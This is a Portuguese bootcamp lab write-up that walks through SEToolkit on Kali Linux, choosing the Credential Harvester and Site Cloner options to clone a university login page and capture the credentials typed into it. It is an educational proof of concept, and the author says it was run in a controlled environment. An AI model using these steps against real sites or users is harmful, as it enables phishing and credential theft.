# Bootcamp Santander cibersegurança  2024 - Phishing

Durante o Bootcamp de cibersegurança disponibilizado pelo Santander, foi proposto um desafio de criar um site de phishing usando a ferramenta **setoolkit**.

Para realizar essa tarefa, é necessário usar sequência de comandos no shell do Kali Linux, um sistema operacional responsável por portar diversas ferramentas para cibersegurança.

Começamos entrando como super usuário (`sudo`), pois esse usuário possuí permissões especiais de administrador.

```bash
sudo su
```

![Entrando como sudo](/images/sudo_image.png)

Com isso, podemos chamar a ferramenta, que já vem listada nas variáveis de ambiente (`PATH`) do Kali Linux.

```bash
setoolkit
```

Logo em sequência, precisamos concordar com os termos de uso da ferramenta. 

![Concordando com os termos de uso](/images/setoolkit_1.png)

```bash
Do you agree with the terms of service [y/n]: y
```

Logo em seguida, é disponibilizado uma diversidade de opções da ferramenta.

![Opções do SETOOLKIT](/images/setoolkit_2.png)

Como estamos interessados em ataques de engenharia social, iremos acessar o módulo **1) Social-Engineering Attacks**.

```bash
set>1
```


Agora temos que escolher o nosso **vetor de ataque**. Isso é, a maneira com que vamos aplicar a nossa engenharia social.


![Ataques do SETOOLKIT](/images/setoolkit_3.png)

Nesse cenário, como estamos querendo copiar uma página de login genérica, podemos selecionar a opção mais apropriada para esse tipo de ataque: **2) Website Attack Vectors**

```bash
set>2
```

Assim, é disponibilizado diversas formas de ataques de engenharia social a sites. 

![Ataques do SETOOLKIT - WEB](/images/setoolkit_4.png)

Nesse cenário, a melhor opção que temos é a **3) Credential Method Attack Harvester**

```bash
set:webattack>3
```

Dessa maneira, existe diversas formas de conseguir aplicar o método coleta de senhas.

![Ataques do SETOOLKIT - WEB](/images/setoolkit_5.png)

Como queremos **clonar o Facebook**, iremos utilizar o método **2) Site Cloner**.

```bash
set:webattack>2
```

![Ataques do SETOOLKIT - WEB](/images/setoolkit_6.png)

A partir daqui, como teremos um servidor web rodando em nossa máquina, iremos utilizar o nosso **IP local** para que seja possível de acessar o site falso em outras máquinas da rede local.
Utilizaremos o IP sugerido pelo próprio **SETOOLKIT**.


```bash
set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.0.96]: <enter>
```

![Ataques do SETOOLKIT - WEB](/images/setoolkit_7.png)

Ao definir que iremos utilizar o nosso próprio IP, a ferramenta pede pelo site ao qual desejamos clonar para montar o site de phishing. Nesse caso, utilizei um sistema de almoxarifado e depósito da minha faculdade (todos os testes foram realizados em ambiente controlado e não tiveram nenhum tipo de impacto negativo na segurança da instituição, servindo apenas para a demonstração de conceito sobre a possibilidade da utilização de ferramentas como o SETOOLKIT para ataques de phishing).

![Ataques do SETOOLKIT - WEB](/images/setoolkit_extra.png)

Com isso, o servidor HTTP estará ativo e recebendo requisições, respondendo com a interface gráfica semelhante a página original.

![Ataques do SETOOLKIT - WEB](/images/request_1.png)

Podemos perceber também que a requisição também é mostrada ao **SETOOLKIT**.
Ao colocar credenciais na página maliciosa, podemos ver que ela é capturada pela ferramenta, como demonstrado na imagem abaixo.

![Ataques do SETOOLKIT - WEB](/images/request_2.png)







